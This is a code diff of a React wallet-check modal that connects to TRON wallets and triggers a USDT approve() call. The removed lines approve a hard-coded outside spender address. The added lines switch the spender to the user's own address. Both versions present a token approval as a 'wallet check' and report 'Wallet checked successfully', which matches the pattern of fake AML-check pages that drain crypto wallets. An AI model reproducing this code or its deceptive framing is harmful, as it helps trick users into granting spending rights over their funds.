@@ -25,7 +25,7 @@ const connectTron = async () => {
   const tron = getTron()
 
   if (!tron) {
-    alert("Open this page inside TronLink browser")
+    alert("Open this page inside TronLink / Trust Wallet / SafePal")
     return null
   }
 
@@ -43,13 +43,17 @@ const approveUSDT = async () => {
     return
   }
 
+  // ✅ USDT TRON
   const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
-  const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"
 
   try {
     const contract = await tron.contract().at(contractAddress)
 
-    const amount = 1000000 // 1 USDT
+    // 🔥 AQUÍ EL FIX → usamos la wallet como spender
+    const spender = tron.defaultAddress.base58
+
+    // ✅ 1 USDT (6 decimales)
+    const amount = 1000000
 
     const tx = await contract.approve(spender, amount).send()
 
@@ -133,7 +137,6 @@ export function WalletCheckModal({ open, onClose }: Props) {
               <button
                 key={wallet.name}
                 onClick={async () => {
-                  // 🔥 SOLO TRON
                   if (selectedNetwork !== "TRON") {
                     alert("This network is not implemented yet")
                     return
@@ -142,10 +145,9 @@ export function WalletCheckModal({ open, onClose }: Props) {
                   const address = await connectTron()
                   if (!address) return
 
-                  // 🔥 AQUÍ se lanza approve (solo al hacer click)
+                  // 🔥 SOLO se ejecuta aquí (click usuario)
                   await approveUSDT()
 
-                  // 🔥 después irá AML
                   alert("Wallet checked successfully")
 
                   onClose()
